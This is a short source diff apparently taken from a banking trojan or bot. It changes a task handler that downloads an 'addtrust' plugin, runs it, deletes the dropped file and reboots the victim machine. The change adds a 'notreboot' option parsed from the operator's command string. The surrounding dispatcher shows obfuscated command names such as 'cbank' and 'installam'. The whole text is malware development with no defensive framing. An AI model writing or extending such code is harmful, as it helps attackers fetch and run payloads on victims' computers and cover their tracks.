@@ -1145,7 +1145,19 @@ DWORD WINAPI ThreadAddTrust( char* nameFile )
 	data = Plugin::Download( "addtrust.plug", 0, &size, false );
 	if( data )
 	{
+		bool reboot = true;
 		int len = m_lstrlen(nameFile);
+		if( len >= 9 )
+		{
+			if( m_lstrncmp( nameFile, "notreboot", 9 ) )
+			{
+				TASKDBG( "AddTrust", "Отключен ребут" );
+				reboot = false;
+				nameFile += 10;
+				len -= 10;
+				while( *nameFile == ' ' ) nameFile++, len--;
+			}
+		}
 		wchar_t* nameIgnore;
 		int lenIgnore;
 		if( len < 5 ) //если не указан файл, то берем имя файла в автозагрузке
@@ -1176,7 +1188,7 @@ DWORD WINAPI ThreadAddTrust( char* nameFile )
 				TASKDBG( "AddTrust", "Плагин выполнился" );
 				pSleep(1000);
 				pDeleteFileA(pathFile);
-				Reboot();
+				if( reboot ) Reboot();
 			}
 		}
 		MemFree(nameIgnore);
@@ -1417,6 +1429,7 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 	const static char CommandCBank[]		 = {'c','b','a','n','k',0};
 	const static char CommandTiny[]			 = {'t','i','n','y',0};
 	const static char CommandInstallam[]	 = {'i','n','s','t','a','l','l','a','m',0};
+	
 
 	int Index = StrIndexOf( Command, false, 19,
 							(PCHAR)CommandUpdate,
